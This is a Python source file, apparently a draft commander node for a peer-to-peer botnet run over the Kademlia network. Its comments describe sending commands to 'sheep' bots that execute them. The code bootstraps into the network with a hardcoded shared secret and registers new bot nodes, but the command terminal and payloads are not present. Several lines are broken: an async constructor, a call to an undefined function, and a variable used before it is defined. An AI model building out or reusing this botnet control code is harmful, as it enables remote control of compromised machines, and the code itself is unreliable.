#### Asycn and Kademlia P2P Botnet ####
#### Commander is program which will start a kademlia server, bootstrap to the network, and listen for additional kademlia queries in the background
#### It will then create an interactive terminal in which the commander will pass commands which can be distributed via kademlia to the other bots in the network
#### Nodes will be organized into two types SHEEP = passive listeners which execute commands, and SHEPARDS = commander nodes which administer commands
import asyncio, os, sys, logging
import hashlib
from kademlia.network import Server
SECRET="TheSecretKey"


### Intialize logging 
handler = logging.StreamHandler()
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
handler.setFormatter(formatter)
log = logging.getLogger('kademlia')
log.addHandler(handler)
log.setLevel(logging.DEBUG)

### Class which checks for existing networks, and will create its own key/val and join
class Shepard():
    # Key is hash of secret string
    async def __init__(self, kserver, key):
        self.kserver = kserver
        self.key = key
        self.sheeps = {}
        self.count = 0
        #TODO: add looping call to check for new nodes
        self.sheeploop = loop.call_soon_threadsafe(checknewsheep())

    async def checknewsheep(self):
        async def addsheep(val): 
            if val:
                # new sheep found
                if val not in self.sheeps:
                    # Create new UUID for node
                    valhash = hashlib.sha1()
                    valhash.update(str(val))
                    newval= valhash.hexdigest()
                    self.sheeps[val] = newval
                    ## Set the index of val to key, and val to val
                    await self.kserver.set(self.sheeps[val], str(val))   
        await addsheep(self.kserver.get(self.key))


if len(sys.argv) != 4:
    print("Usage: python commander.py <bootstrap node> <bootstrap port> <commander port>")
    sys.exit(1)

### SERVER STARTS HERE ###

### Initialize program loop
boot_ip = str(sys.argv[1])
boot_port = int(sys.argv[2])
myport = int(sys.argv[3])

### Initialize the Key "specialstring" which all nodes will join network with###
key = hashlib.sha1()
key.update(SECRET.encode('utf-8'))
keyhash = key.hexdigest()


loop=asyncio.get_event_loop()
loop.set_debug(True)

kserver = Server()
loop.run_until_complete(kserver.bootstrap([(boot_ip, boot_port)]))
loop.run_until_complete(kserver.listen(myport))




try:
    loop.run_forever()
except KeyboardInterrupt:
    pass
finally:
    kserver.stop()
    loop.close()